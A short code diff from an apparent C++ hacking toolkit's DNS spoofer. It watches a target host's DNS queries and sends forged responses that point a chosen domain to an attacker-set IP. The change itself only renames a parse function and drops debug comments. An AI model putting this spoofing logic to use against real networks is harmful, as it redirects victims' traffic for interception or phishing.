@@ -40,16 +40,12 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
                 IPv4Header* ipv4Header = (IPv4Header*)packet.GetLayerStart(1);
                 if(targetIPAddr.sin_addr.s_addr == ipv4Header->ip_src.s_addr)
                 {
-                    dnsParser.ParseToHostFormat(*dnsHeader);
-                    // dnsParser.PrintQueries();
+                    dnsParser.Parse(*dnsHeader);
 
                     for(unsigned int i = 0; i < dnsParser.header.qcount; ++i)
                     {
                         if((PacketCraft::FindInStr(dnsParser.questionsArray[i].qName, domain) != -1) && dnsParser.questionsArray[i].qType == 1)
                         {
-                            // std::cout << "dns request matching domain name received: \n";
-                            // packet.Print();
-
                             PacketCraft::Packet dnsResponse;
                             CreateFakeDNSResponse(packet, dnsResponse, fakeDomainIP, IPVersion::IPV4, dnsParser.questionsArray[i]);
                             std::cout << "fake response created:\n";
@@ -82,7 +78,7 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
                 IPv6Header* ipv6Header = (IPv6Header*)packet.GetLayerStart(1);
                 if(memcmp(targetIPAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, 16) == 0)
                 {
-                    dnsParser.ParseToHostFormat(*dnsHeader);
+                    dnsParser.Parse(*dnsHeader);
 
                 }
             }
